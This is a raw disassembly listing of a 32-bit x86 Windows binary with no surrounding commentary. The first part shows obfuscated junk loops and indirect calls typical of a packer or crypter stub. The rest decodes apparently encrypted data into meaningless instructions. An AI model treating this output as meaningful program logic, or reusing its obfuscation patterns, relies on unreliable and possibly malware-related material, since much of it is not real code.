  40fcea:	mov    DWORD PTR [edx],ecx
  40fcec:	xor    ecx,ecx
  40fcee:	mov    ecx,DWORD PTR [ebp-0x18]
  40fcf1:	and    DWORD PTR ds:0x42b1e2,0x0
  40fcfb:	xor    edi,edi
  40fcfd:	xor    edi,DWORD PTR ds:0x42b1e2
  40fd03:	inc    edi
  40fd04:	mov    DWORD PTR ds:0x42b1e2,edi
  40fd0a:	cmp    DWORD PTR ds:0x42b1e2,0x29
  40fd11:	ja     0x40fd32
  40fd17:	jmp    0x40fd25
  40fd1c:	push   DWORD PTR [ebp-0x14]
  40fd1f:	call   DWORD PTR ds:0x42b2f2
  40fd25:	cmp    DWORD PTR ds:0x42b1e2,0x19
  40fd2c:	jb     0x40fcfb
  40fd32:	xor    ecx,eax
  40fd34:	and    edi,0x72ff
  40fd3a:	add    ecx,esi
  40fd3c:	or     DWORD PTR ds:0x42b182,0x54fc
  40fd46:	mov    DWORD PTR [ebp-0xc],ecx
  40fd49:	adc    edi,DWORD PTR ds:0x42b1e6
  40fd4f:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  40fd56:	or     edi,DWORD PTR ds:0x42b226
  40fd5c:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  40fd63:	and    DWORD PTR ds:0x42b1ba,0x0
  40fd6d:	jmp    0x40fd7f
  40fd72:	mov    ecx,DWORD PTR ds:0x42b1ba
  40fd78:	inc    ecx
  40fd79:	mov    DWORD PTR ds:0x42b1ba,ecx
  40fd7f:	cmp    DWORD PTR ds:0x42b1ba,0x12
  40fd86:	jae    0x40fdca
  40fd8c:	cmp    DWORD PTR ds:0x42b1ba,0x4
  40fd93:	jle    0x40fdca
  40fd99:	jmp    0x40fda9
  40fd9e:	push   0x42b226
  40fda3:	call   DWORD PTR ds:0x42b2f6
  40fda9:	cmp    DWORD PTR ds:0x42b1ba,0x3
  40fdb0:	jne    0x40fdc5
  40fdb6:	xor    ecx,ecx
  40fdb8:	xor    ecx,DWORD PTR ds:0x42b1ba
  40fdbe:	inc    ecx
  40fdbf:	mov    DWORD PTR ds:0x42b1ba,ecx
  40fdc5:	jmp    0x40fd72
  40fdca:	mov    DWORD PTR [ebp-0x10],0xf89c95a5
  40fdd1:	mov    ecx,DWORD PTR [ebp-0x14]
  40fdd4:	mov    DWORD PTR [ebp+0x8],ecx
  40fdd7:	mov    ecx,DWORD PTR [ebp+0x8]
  40fdda:	xor    DWORD PTR ds:0x42b20a,edi
  40fde0:	xor    ecx,eax
  40fde2:	or     edi,DWORD PTR ds:0x42b182
  40fde8:	add    ecx,esi
  40fdea:	mov    ecx,0x242ebf1
  40fdef:	mov    edi,0xf641bf0
  40fdf4:	je     0x419191
  40fdfa:	add    DWORD PTR ds:0x42b1c2,0x6a2f
  40fe04:	mov    edx,DWORD PTR [ebp+0x8]
  40fe07:	mov    ebx,DWORD PTR ds:0x42b1aa
  40fe0d:	and    ebx,DWORD PTR ds:0x42b1f2
  40fe13:	mov    DWORD PTR ds:0x42b1aa,ebx
  40fe19:	mov    ebx,DWORD PTR [ebp-0x8]
  40fe1c:	xor    edx,eax
  40fe1e:	xor    ebx,eax
  40fe20:	xor    DWORD PTR ds:0x42b1e6,0x42b196
  40fe2a:	sub    edx,ebx
  40fe2c:	sub    edx,esi
  40fe2e:	mov    DWORD PTR ds:0x42b1ce,0x13
  40fe38:	cmp    DWORD PTR ds:0x42b1ce,0x0
  40fe3f:	je     0x40fe81
  40fe45:	cmp    DWORD PTR ds:0x42b1ce,0x1c
  40fe4c:	jb     0x40fe81
  40fe52:	jmp    0x40fe6f
  40fe57:	push   0x42b1ca
  40fe5c:	push   0x42b196
  40fe61:	push   DWORD PTR [ebp-0x1c]
  40fe64:	push   0x42a12c
  40fe69:	call   DWORD PTR ds:0x42b2fa
  40fe6f:	mov    ebx,DWORD PTR ds:0x42b1ce
  40fe75:	dec    ebx
  40fe76:	mov    DWORD PTR ds:0x42b1ce,ebx
  40fe7c:	jmp    0x40fe38
  40fe81:	xor    edx,eax
  40fe83:	and    DWORD PTR ds:0x42b196,0x0
  40fe8d:	jmp    0x40fe9f
  40fe92:	mov    ebx,DWORD PTR ds:0x42b196
  40fe98:	inc    ebx
  40fe99:	mov    DWORD PTR ds:0x42b196,ebx
  40fe9f:	cmp    DWORD PTR ds:0x42b196,0x1b
  40fea6:	jae    0x40feef
  40feac:	cmp    DWORD PTR ds:0x42b196,0x6
  40feb3:	jb     0x40feef
  40feb9:	jmp    0x40fece
  40febe:	push   0x42b226
  40fec3:	push   0x42a000
  40fec8:	call   DWORD PTR ds:0x42b2fe
  40fece:	cmp    DWORD PTR ds:0x42b196,0x5
  40fed5:	jne    0x40feea
  40fedb:	xor    ebx,ebx
  40fedd:	add    ebx,DWORD PTR ds:0x42b196
  40fee3:	inc    ebx
  40fee4:	mov    DWORD PTR ds:0x42b196,ebx
  40feea:	jmp    0x40fe92
  40feef:	mov    DWORD PTR [ebp+0x8],edx
  40fef2:	and    DWORD PTR ds:0x42b196,0x0
  40fefc:	jmp    0x40ff10
  40ff01:	xor    ebx,ebx
  40ff03:	xor    ebx,DWORD PTR ds:0x42b196
  40ff09:	inc    ebx
  40ff0a:	mov    DWORD PTR ds:0x42b196,ebx
  40ff10:	cmp    DWORD PTR ds:0x42b196,0x15
  40ff17:	jae    0x40ff62
  40ff1d:	cmp    DWORD PTR ds:0x42b196,0x4
  40ff24:	jb     0x40ff62
  40ff2a:	jmp    0x40ff43
  40ff2f:	push   DWORD PTR [ebp-0xc]
  40ff32:	push   DWORD PTR [ebp-0x1c]
  40ff35:	push   0x42a1d7
  40ff3a:	push   DWORD PTR [ebp-0xc]
  40ff3d:	call   DWORD PTR ds:0x42b306
  40ff43:	cmp    DWORD PTR ds:0x42b196,0x3
  40ff4a:	jne    0x40ff5d
  40ff50:	mov    ebx,DWORD PTR ds:0x42b196
  40ff56:	inc    ebx
  40ff57:	mov    DWORD PTR ds:0x42b196,ebx
  40ff5d:	jmp    0x40ff01
  40ff62:	mov    edx,DWORD PTR [ebp+0x8]
  40ff65:	and    DWORD PTR ds:0x42b21a,0x0
  40ff6f:	jmp    0x40ff81
  40ff74:	mov    ebx,DWORD PTR ds:0x42b21a
  40ff7a:	inc    ebx
  40ff7b:	mov    DWORD PTR ds:0x42b21a,ebx
  40ff81:	cmp    DWORD PTR ds:0x42b21a,0x17
  40ff88:	jae    0x40ffd0
  40ff8e:	cmp    DWORD PTR ds:0x42b21a,0xe
  40ff95:	jb     0x40ffd0
  40ff9b:	jmp    0x40ffb1
  40ffa0:	push   0x42a23f
  40ffa5:	push   DWORD PTR [ebp-0x20]
  40ffa8:	push   DWORD PTR [ebp-0xc]
  40ffab:	call   DWORD PTR ds:0x42b30e
  40ffb1:	cmp    DWORD PTR ds:0x42b21a,0xd
  40ffb8:	jne    0x40ffcb
  40ffbe:	mov    ebx,DWORD PTR ds:0x42b21a
  40ffc4:	inc    ebx
  40ffc5:	mov    DWORD PTR ds:0x42b21a,ebx
  40ffcb:	jmp    0x40ff74
  40ffd0:	mov    ebx,DWORD PTR [ebp-0x58]
  40ffd3:	add    DWORD PTR ds:0x42b20e,0x42b1de
  40ffdd:	add    edx,0x5708e2
  40ffe3:	imul   edx,ebx
  40ffe6:	or     DWORD PTR ds:0x42b1b6,0x7440
  40fff0:	mov    DWORD PTR [ebp-0x58],edx
  40fff3:	sub    DWORD PTR ds:0x42b192,ecx
  40fff9:	jmp    0x412359
  40fffe:	add    al,0x23
  410000:	cld    
  410001:	shl    esp,1
  410003:	mov    al,BYTE PTR [edx]
  410005:	xchg   edx,eax
  410006:	(bad)  
  410009:	retf   0xc894
  41000c:	scas   al,BYTE PTR es:[edi]
  41000d:	lods   eax,DWORD PTR ds:[esi]
  41000e:	aas    
  41000f:	scas   eax,DWORD PTR es:[edi]
  410010:	add    DWORD PTR [ebx-0x7c7ca1c2],0x4f
  410017:	sbb    BYTE PTR [ebp+0xb],dh
  41001a:	sbb    BYTE PTR [eax-0x7c],bl
  41001d:	push   edi
  41001e:	outs   dx,DWORD PTR ds:[esi]
  41001f:	mov    DWORD PTR [ecx],ebp
  410021:	jns    0x40fff1
  410023:	mov    dh,0xac
  410025:	enter  0xdb84,0x7b
  410029:	push   es
  41002a:	ret    0xb56c
  41002d:	loopne 0x410067
  41002f:	xchg   edx,eax
  410030:	inc    ecx
  410031:	pop    esi
  410032:	pop    esi
  410033:	addr16 mov bl,0x59
  410036:	push   edi
  410037:	rcr    edi,1
  410039:	out    0x5b,eax
  41003b:	add    dl,ch
  41003d:	cmp    BYTE PTR [edx-0x14],ah
  410040:	lea    ecx,[edx-0x4d8adc55]
  410046:	push   esi
  410047:	in     al,dx
  410048:	mov    bh,0xaf
  41004a:	shl    DWORD PTR [edx],0x1
  41004d:	mov    eax,0x250b265d
  410052:	ja     0x410050
  410054:	xor    al,BYTE PTR [edi-0x30afb1b1]
  41005a:	mov    eax,0x760ac7ef
  41005f:	or     DWORD PTR [eax+0x64],0x9377c528
  410066:	lds    edx,FWORD PTR [edx]
  410068:	pop    ss
  410069:	outs   dx,DWORD PTR ds:[esi]
  41006a:	aad    0xc8
  41006c:	sub    al,dh
  41006e:	inc    esp
  41006f:	fwait
  410070:	sub    al,0x1f
  410072:	mov    edx,gs
  410074:	inc    ebp
  410075:	js     0x410068
  410077:	or     BYTE PTR [edx+0x13],dl
  41007a:	es stc 
  41007c:	fucomip st,st(6)
  41007e:	mul    DWORD PTR [ecx+0x54]
  410081:	push   eax
  410082:	lods   eax,DWORD PTR ds:[esi]
  410083:	aas    
  410084:	mov    ah,0x8c
  410086:	mov    al,0xae
  410088:	out    0x3f,eax
  41008a:	imul   ebp,DWORD PTR [ebp-0x60],0xffffff83
  41008e:	push   ecx
  41008f:	mov    ecx,0xed4570b9
  410094:	cs loope 0x4100be
  410097:	pusha  
  410098:	hlt    
  410099:	xlat   BYTE PTR ds:[ebx]
  41009a:	popa   
  41009b:	or     ch,BYTE PTR [eax+0x3d]
  41009e:	in     al,0xdf
  4100a0:	sub    ecx,DWORD PTR [ebp-0x4b]
  4100a3:	mov    ds:0x1c0b377b,al
  4100a8:	fld    DWORD PTR [ebx+0x22]
  4100ab:	and    ebp,edx
  4100ad:	cs push 0x7afbbf19
  4100b3:	mov    ?,WORD PTR [edi-0x459c7c1a]
  4100b9:	ret    
  4100ba:	mov    al,0xb8
  4100bc:	dec    esi
  4100bd:	xor    edi,0xb8e4f48c
  4100c3:	fst    QWORD PTR [ecx-0x4787cece]
  4100c9:	pop    ss
  4100ca:	mov    ecx,0x25b16395
  4100cf:	js     0x41011b
  4100d1:	jbe    0x41005b
  4100d3:	jmp    0x4100b8
  4100d5:	stc    
  4100d6:	mov    cl,0x1d
  4100d8:	mov    ebp,0x25f6b839
  4100dd:	dec    esi
  4100de:	push   eax
  4100df:	(bad)  
  4100e0:	icebp  
  4100e1:	in     al,0xde
  4100e3:	sbb    ecx,DWORD PTR [esi-0x6ac88196]
  4100e9:	mov    al,0x70
  4100eb:	add    al,0x31
  4100ed:	fldenv [edi]
  4100ef:	pop    esi
  4100f0:	popa   
  4100f1:	xchg   edi,eax
  4100f2:	mov    ch,0x8f
  4100f4:	and    esp,ebp
  4100f6:	jns    0x41007f
  4100f8:	dec    ebp
  4100f9:	(bad)  
  4100fa:	outs   dx,DWORD PTR ds:[esi]
  4100fb:	repz mov ch,0x5f
  4100fe:	cdq    
  4100ff:	jp     0x410095
  410101:	std    
  410102:	sar    esi,0x28
  410105:	je     0x410183
  410107:	js     0x410172
  410109:	in     eax,dx
  41010a:	add    al,0x6d
  41010c:	(bad)  
  41010d:	mov    es,edx
  41010f:	cmc    
  410110:	fmul   DWORD PTR [edi-0x737da411]
  410116:	js     0x4100c0
  410118:	cli    
  410119:	xchg   ecx,eax
  41011a:	mov    ds:0x2305664a,al
  41011f:	push   0x82b21b63
  410124:	pop    ebx
  410125:	call   0xa3d4:0x63be0e66
  41012c:	rol    BYTE PTR [ebp+0x39ccfb6f],0x45
  410133:	(bad)  
  410134:	imul   esp,DWORD PTR [esi-0x2f],0xffffffba
  410138:	pop    edi
  410139:	mov    ds:0xb382eeb7,eax
  41013e:	xor    BYTE PTR ss:[edi+eax*4-0x200c0b58],ch
  410146:	loopne 0x41010d
  410148:	ins    BYTE PTR es:[edi],dx
  410149:	addr16 inc eax
  41014b:	rol    BYTE PTR [ebx],0x4c
  41014e:	imul   esp,DWORD PTR [ebx],0xfcf8be37
  410154:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410155:	xchg   edi,eax
  410156:	xchg   ecx,eax
  410157:	sub    eax,0xe73374fb
  41015c:	stos   DWORD PTR es:[edi],eax
  41015d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41015e:	fs pop eax
  410160:	fs dec esi
  410162:	inc    ebx
  410163:	xchg   edx,eax
  410164:	dec    eax
  410165:	leave  
  410166:	inc    ecx
  410167:	fldcw  WORD PTR [ebx]
  410169:	ror    DWORD PTR [edx],1
  41016b:	gs jno 0x4100f0
  41016e:	cdq    
  41016f:	mov    BYTE PTR [ebx+0x4672dd11],bl
  410175:	leave  
  410176:	cmp    al,0x85
  410178:	jmp    0x7074:0x7b3da158
  41017f:	jne    0x410173
  410181:	ins    BYTE PTR es:[edi],dx
  410182:	imul   edx,edi,0x41
  410185:	add    BYTE PTR [ebp+0xc],ch
  410188:	xor    DWORD PTR [ebp+0x49],ebx
  41018b:	push   ebp
  41018c:	call   0xba4:0x489b7c6d
  410193:	clc    
  410194:	call   0xcce6f20a
  410199:	inc    esp
  41019a:	add    BYTE PTR [ebx-0x3e6a2a45],0xfa
  4101a1:	out    dx,al
  4101a2:	sub    al,0x71
  4101a4:	push   ebp
  4101a5:	adc    bh,BYTE PTR [esi-0x56]
  4101a8:	out    dx,al
  4101a9:	ret    0x7cf1
  4101ac:	fwait
  4101ad:	push   0xffffff8f
  4101af:	sub    eax,0xc6607daa
  4101b4:	sub    bl,bl
  4101b6:	adc    dh,cl
  4101b8:	ss xor eax,0x7fdc8433
  4101be:	loop   0x4101c6
  4101c0:	pop    esp
  4101c1:	ins    DWORD PTR es:[edi],dx
  4101c2:	pusha  
  4101c3:	add    DWORD PTR [edi],ebx
  4101c5:	or     edx,0xe
  4101c8:	loopne 0x410152
  4101ca:	xchg   DWORD PTR [edx+0x6415fa5a],ecx
  4101d0:	pusha  
  4101d1:	pop    esp
  4101d2:	dec    ebp
  4101d3:	call   0x1f46:0x6a01211d
  4101da:	and    eax,0x4851fd49
  4101df:	adc    eax,0x202a7aa8
  4101e4:	faddp  st(1),st
  4101e6:	or     al,0x9f
  4101e8:	xchg   esi,eax
  4101e9:	dec    esi
  4101ea:	mov    dh,0xfd
  4101ec:	outs   dx,DWORD PTR ds:[esi]
  4101ed:	jl     0x4101d0
  4101ef:	ret    0x2d91
  4101f2:	call   0x523a:0x7b7c6385
  4101f9:	ins    BYTE PTR es:[edi],dx
  4101fa:	out    0x80,al
  4101fc:	xor    DWORD PTR [eax+0x7d],edx
  4101ff:	pop    ss
  410200:	add    eax,0xfd35be32
  410205:	jmp    0x34b1:0xa839dc5f
  41020c:	push   0x7a
  41020e:	and    eax,esi
  410210:	ror    DWORD PTR [ebp-0x33],1
  410213:	in     al,0x82
  410215:	jp     0x410203
  410217:	xor    bl,BYTE PTR [ebx+0x2]
  41021a:	(bad)  
  41021b:	inc    esi
  41021c:	pop    ss
  41021d:	lds    esi,FWORD PTR [ebx+esi*2+0x728d8bb1]
  410224:	pop    ebx
  410225:	push   esp
  410226:	ja     0x4101eb
  410228:	adc    al,0xad
  41022a:	pop    esi
  41022b:	sar    DWORD PTR [eax],1
  41022d:	aad    0xa3
  41022f:	mov    bh,0x40
  410231:	dec    edx
  410232:	call   0xfe0aec1
  410237:	or     DWORD PTR [ebp+eax*8+0x0],ebp
  41023b:	imul   esi,ebp,0x2c
  41023e:	int3   
  41023f:	or     BYTE PTR [edi],al
  410241:	or     esp,DWORD PTR [edi]
  410243:	inc    edx
  410244:	std    
  410245:	leave  
  410246:	and    BYTE PTR [ebx+0x1c116dd8],al
  41024c:	(bad)  
  41024d:	clc    
  41024e:	(bad)  
  41024f:	retf   
  410250:	push   0x11
  410252:	(bad)  
  410253:	out    0xf,eax
  410255:	ror    cl,0x13
  410258:	(bad)  
  410259:	mov    ds:0x9bab3b26,eax
  41025e:	xchg   edi,eax
  41025f:	adc    bh,BYTE PTR [ebx+ebp*1]
  410262:	leave  
  410263:	add    edi,DWORD PTR [edi+0x1821b688]
  410269:	aam    0x44
  41026b:	(bad)  
  41026c:	jbe    0x4102d2
  41026e:	das    
  41026f:	ins    BYTE PTR es:[edi],dx
  410270:	push   ss
  410271:	jnp    0x4102db
  410273:	ja     0x410201
  410275:	xchg   DWORD PTR [ebp-0x43],ecx
  410278:	jg     0x4102d2
  41027a:	xor    al,0xb7
  41027c:	cmp    eax,0x4690d03d
  410281:	cmc    
  410282:	sub    eax,0xb83bd030
  410287:	and    eax,ebx
  410289:	mov    ebx,edx
  41028b:	pop    ss
  41028c:	xor    ebx,DWORD PTR [ebx]
  41028e:	sbb    BYTE PTR gs:[edi-0x3cdeffe0],0x5e
  410296:	cmp    esp,ebx
  410298:	pop    ebp
  410299:	or     esi,DWORD PTR [ebp+0x19116297]
  41029f:	iret   
  4102a0:	sahf   
  4102a1:	xchg   ebx,eax
  4102a2:	xchg   edi,eax
  4102a3:	xchg   edi,eax
  4102a4:	mov    al,ds:0xffde7a69
  4102a9:	daa    
  4102aa:	xor    eax,DWORD PTR [edi]
  4102ac:	cdq    
  4102ad:	loopne 0x4102d4
  4102af:	or     ch,BYTE PTR [eax-0x52]
  4102b2:	fcomi  st,st(4)
  4102b4:	ss pop edi
  4102b6:	mov    dl,0x8d
  4102b8:	outs   dx,DWORD PTR ds:[esi]
  4102b9:	and    edi,DWORD PTR [ebp-0x4097eb46]
  4102bf:	jmp    0x855f783c
  4102c4:	mov    ds:0xaa90018a,al
  4102c9:	pop    ecx
  4102ca:	push   ds
  4102cb:	stos   DWORD PTR es:[edi],eax
  4102cc:	jmp    0x15f8:0xc165d656
  4102d3:	fwait
  4102d4:	or     esi,DWORD PTR [edi-0x2a]
  4102d7:	cmp    cl,BYTE PTR [eax-0x67]
  4102da:	dec    BYTE PTR [ebp-0x241bb4f]
  4102e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102e1:	out    0x24,al
  4102e3:	and    eax,0x614f3f5f
  4102e8:	push   0x429acb8f
  4102ed:	sub    ecx,DWORD PTR [ecx+ecx*1+0x2b]
  4102f1:	test   al,0x5c
  4102f3:	sub    BYTE PTR [ecx+edi*4+0x24],bh
  4102f7:	shl    DWORD PTR [ecx+eiz*1],cl
  4102fa:	mov    BYTE PTR [eax-0x1f],bl
  4102fd:	ret    0x4cc9
  410300:	adc    edx,DWORD PTR [edi-0x4f6d796a]
  410306:	out    0x33,eax
  410308:	das    
  410309:	les    edi,FWORD PTR [edi*1+0x522d1735]
  410310:	fstp   QWORD PTR [edx-0x630b673f]
  410316:	outs   dx,DWORD PTR ds:[esi]
  410317:	jns    0x4102a9
  410319:	dec    eax
  41031a:	iret   
  41031b:	popa   
  41031c:	jnp    0x410376
  41031e:	push   0xfffffff4
  410320:	xor    edx,DWORD PTR [esi+ecx*2]
  410323:	mov    bl,0xa4
  410325:	cmp    al,0x6e
  410327:	repnz lds ecx,FWORD PTR [edi]
  41032a:	add    dh,cl
  41032c:	or     eax,0xf584ab67
  410331:	add    al,0x0
  410333:	into   
  410334:	pop    edx
  410335:	jae    0x410387
  410337:	mov    bl,0x15
  410339:	fwait
  41033a:	add    BYTE PTR ds:0x2ec707b6,dh
  410340:	mov    ah,0x73
  410342:	fwait
  410343:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410344:	dec    esi
  410345:	pop    esi
  410346:	sbb    BYTE PTR [edx-0x3f],bh
  410349:	or     eax,0x3478742c
  41034e:	sub    ah,cl
  410350:	je     0x410342
  410352:	push   ecx
  410353:	xchg   ebp,eax
  410354:	cmp    ah,cl
  410356:	dec    ecx
  410357:	pop    esi
  410358:	outs   dx,DWORD PTR ds:[esi]
  410359:	repz xchg esi,eax
  41035b:	dec    esi
  41035c:	mov    cl,0x80
  41035e:	adc    bh,bh
  410360:	push   ds
  410361:	repnz add eax,0xde7f7836
  410367:	push   ecx
  410368:	in     al,0x99
  41036a:	jnp    0x41031a
  41036c:	mov    bl,0xf7
  41036e:	sbb    esi,DWORD PTR [ebx+0x33]
  410371:	and    al,0x5b
  410373:	repnz sub ah,BYTE PTR [edx+0x73f4e312]
  41037a:	pushf  
  41037b:	push   edx
  41037c:	jecxz  0x410341
  41037e:	ret    0xa974
  410381:	ins    BYTE PTR es:[edi],dx
  410382:	xchg   ebx,eax
  410383:	jp     0x410391
  410385:	sbb    al,0x2
  410387:	mov    ecx,0x7b7b8038
  41038c:	sub    esi,esp
  41038e:	xlat   BYTE PTR ds:[ebx]
  41038f:	pop    esp
  410390:	jb     0x4103fe
  410392:	add    ebx,DWORD PTR fs:[esi]
  410395:	ret    
  410396:	fimul  WORD PTR [ebp-0x1b]
  410399:	test   DWORD PTR [esi+esi*4+0x7f],ebx
  41039d:	jle    0x410406
  41039f:	mov    ebx,0x6c7ee10a
  4103a4:	jae    0x4103ba
  4103a6:	xor    esp,esi
  4103a8:	pop    esi
  4103a9:	outs   dx,DWORD PTR ds:[esi]
  4103aa:	push   edx
  4103ab:	fld    DWORD PTR [ecx+edi*8+0x4966b7e0]
  4103b2:	and    edi,ebp
  4103b4:	cdq    
  4103b5:	adc    BYTE PTR [ebp+ecx*8+0x3ec5019],al
  4103bc:	xor    eax,0xb765d388
  4103c1:	in     eax,dx
  4103c2:	push   ss
  4103c3:	add    eax,0xd7e33cdb
  4103c8:	sub    edi,ebp
  4103ca:	add    dh,BYTE PTR [eax+0x74]
  4103cd:	jnp    0x41038c
  4103cf:	pop    eax
  4103d0:	jnp    0x41037d
  4103d2:	xchg   esi,eax
  4103d3:	ret    
  4103d4:	and    al,BYTE PTR [ebx+edi*1-0x5e526a6e]
  4103db:	xchg   esi,eax
  4103dc:	cli    
  4103dd:	adc    DWORD PTR [ecx],esp
  4103df:	mov    al,0x5b
  4103e1:	in     eax,dx
  4103e2:	jne    0x410398
  4103e4:	je     0x410395
  4103e6:	call   0x7ed6:0xf097aa4c
  4103ed:	(bad)  
  4103ee:	or     BYTE PTR ds:0xa3836a2e,al
  4103f4:	mov    edx,0xa23ae69c
  4103f9:	dec    eax
  4103fa:	or     al,0xd6
  4103fc:	ror    BYTE PTR [eax-0x230f28bc],0x4
  410403:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410404:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410405:	push   eax
  410406:	fstp   QWORD PTR [edx]
  410408:	mov    ebx,0x3846df7d
  41040d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41040e:	mov    dl,0x5e
  410410:	stos   BYTE PTR es:[edi],al
  410411:	push   edi
  410412:	leave  
  410413:	rol    BYTE PTR [esi-0x53],1
  410416:	imul   DWORD PTR [ecx]
  410418:	xchg   esp,eax
  410419:	out    0xe5,eax
  41041b:	push   ds
  41041c:	pop    esi
  41041d:	jmp    0x41039f
  41041f:	push   esp
  410420:	aad    0x50
  410422:	enter  0x19ee,0x18
  410426:	out    dx,al
  410427:	aad    0xbb
  410429:	jge    0x410494
  41042b:	jle    0x4103cc
  41042d:	jae    0x410492
  41042f:	ror    BYTE PTR [esp+edi*2+0x1b],cl
  410433:	iret   
  410434:	(bad)  
  410435:	push   esp
  410436:	xor    al,0x24
  410438:	xor    DWORD PTR [ebx],ecx
  41043a:	cwde   
  41043b:	dec    eax
  41043c:	mov    DWORD PTR [edx],eax
  41043e:	sub    ch,BYTE PTR [edi]
  410440:	sbb    BYTE PTR [esi+0x2077b556],bh
  410446:	fild   WORD PTR [esi]
  410448:	out    dx,al
  410449:	xor    esi,DWORD PTR [esi]
  41044b:	cmp    al,0xd6
  41044d:	daa    
  41044e:	and    bh,BYTE PTR [esi]
  410450:	mov    esp,0x6fdf44f9
  410455:	and    eax,0xb60da4ce
  41045a:	mov    al,0xe1
  41045c:	stos   BYTE PTR es:[edi],al
  41045d:	xlat   BYTE PTR ds:[ebx]
  41045e:	stc    
  41045f:	rcl    BYTE PTR [ebx],cl
  410461:	xchg   ebp,eax
  410463:	call   0x25f1ea0b
  410468:	mov    eax,0x1061882
  41046d:	iret   
  41046e:	jo     0x410462
  410470:	push   esp
  410471:	test   eax,0x71fe7d33
  410476:	xchg   esi,eax
  410477:	or     esi,eax
  410479:	stc    
  41047a:	or     dl,BYTE PTR [edi]
  41047c:	ror    BYTE PTR [esi+0x4d],1
  41047f:	mov    ds:0x102b4d31,eax
  410484:	daa    
  410485:	sbb    esp,DWORD PTR [ebx]
  410487:	js     0x410429
  410489:	mov    dh,0xc4
  41048b:	and    al,0x0
  41048d:	jecxz  0x4104a4
  41048f:	ins    DWORD PTR es:[edi],dx
  410490:	sbb    al,0x9a
  410492:	adc    eax,0x943bc315
  410497:	xchg   ebx,eax
  410498:	adc    BYTE PTR [esi-0x31],bl
  41049b:	div    esp
  41049d:	cli    
  41049e:	outs   dx,BYTE PTR ds:[esi]
  41049f:	arpl   WORD PTR [eax-0x6dec682f],ax
  4104a5:	sub    al,0xb4
  4104a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104a8:	sub    bh,BYTE PTR fs:[esi]
  4104ab:	mov    dh,0x30
  4104ad:	aas    
  4104ae:	mov    DWORD PTR [ebx-0x67],esp
  4104b1:	jbe    0x41043d
  4104b3:	xor    DWORD PTR [eax-0x6b066408],edi
  4104b9:	push   eax
  4104ba:	aam    0xc7
  4104bc:	push   esp
  4104bd:	inc    ecx
  4104be:	arpl   WORD PTR [edx-0x3b],sp
  4104c1:	popa   
  4104c2:	scas   al,BYTE PTR es:[edi]
  4104c3:	cli    
  4104c4:	out    dx,eax
  4104c5:	std    
  4104c6:	mov    eax,0xaafbb8a6
  4104cb:	pop    ebp
  4104cc:	popa   
  4104cd:	std    
  4104ce:	fist   DWORD PTR [edx]
  4104d0:	aam    0x34
  4104d2:	dec    esi
  4104d3:	mov    ecx,0x95e73dcf
  4104d8:	shl    esi,1
  4104da:	mov    ch,0x7e
  4104dc:	jp     0x410500
  4104de:	pop    ss
  4104df:	cmovno esi,DWORD PTR [ebx-0x2e]
  4104e3:	pop    es
  4104e4:	in     eax,dx
  4104e5:	xchg   ebx,eax
  4104e6:	inc    esp
  4104e7:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104e9:	ja     0x4104ab
  4104eb:	repnz adc al,0x90
  4104ee:	dec    esp
  4104ef:	in     eax,0xa4
  4104f1:	pop    eax
  4104f2:	stos   BYTE PTR es:[edi],al
  4104f3:	push   0x9de16013
  4104f8:	sub    DWORD PTR [eax-0xc293bc8],esi
  4104fe:	icebp  
  4104ff:	sbb    al,0x19
  410501:	inc    BYTE PTR [ebp+0x62]
  410504:	sbb    dl,BYTE PTR [ebp-0x42]
  410507:	pop    esi
  410508:	daa    
  410509:	rol    BYTE PTR [ebp+0x26c207a8],cl
  41050f:	jl     0x41051b
  410511:	js     0x4104c7
  410513:	ss es mov dh,0x43
  410517:	ret    0x71bd
  41051a:	cmc    
  41051b:	xor    ecx,DWORD PTR [esi]
  41051d:	xchg   ecx,eax
  41051e:	xor    DWORD PTR [ebp+0x26],eax
  410521:	fstp   QWORD PTR [edx-0x6e]
  410524:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410525:	(bad)  
  410526:	pop    esi
  410527:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410528:	pushf  
  410529:	out    0x2a,eax
  41052b:	adc    al,BYTE PTR [eax]
  41052d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41052e:	imul   esp,DWORD PTR [esi],0xccf60fe5
  410534:	loope  0x4104fb
  410536:	out    0x5e,al
  410538:	aam    0xf1
  41053a:	and    BYTE PTR [edi+0x38],ch
  41053d:	jge    0x41056a
  41053f:	dec    ebp
  410540:	loop   0x4104f4
  410542:	pop    eax
  410543:	stos   BYTE PTR es:[edi],al
  410544:	mov    ds,eax
  410546:	pop    ebp
  410547:	fucompp 
  410549:	int3   
  41054a:	xchg   ecx,eax
  41054b:	out    dx,al
  41054c:	sub    eax,0x248a4884
  410551:	mov    cl,0x9b
  410553:	or     eax,eax
  410555:	xchg   ebx,eax
  410556:	lahf   
  410557:	(bad)  
  410558:	and    dl,dl
  41055a:	aaa    
  41055b:	test   al,0x4c
  41055d:	stos   DWORD PTR es:[edi],eax
  41055e:	test   eax,0xec178612
  410563:	jmp    0x410514
  410565:	lds    edx,FWORD PTR [edi-0x31ab285e]
  41056b:	std    
  41056c:	push   ds
  41056d:	fisubr WORD PTR [ebx-0x7e]
  410570:	iret   
  410571:	ins    DWORD PTR es:[edi],dx
  410572:	sar    DWORD PTR [edi-0x42],0x32
  410576:	dec    edi
  410577:	adc    al,0x3b
  410579:	sbb    al,0xec
  41057b:	mul    BYTE PTR [eax+0x69633eae]
  410581:	mov    al,ds:0x67955ba8
  410586:	sbb    BYTE PTR [eax-0x10],bl
  410589:	fstp   st(3)
  41058b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41058c:	pop    esi
  41058d:	stos   DWORD PTR es:[edi],eax
  41058e:	adc    DWORD PTR ds:0xe578c045,ecx
  410594:	loopne 0x41060f
  410596:	xor    ecx,0xb37efd58
  41059c:	dec    ebx
  41059d:	jge    0x41061c
  41059f:	xchg   ecx,eax
  4105a0:	daa    
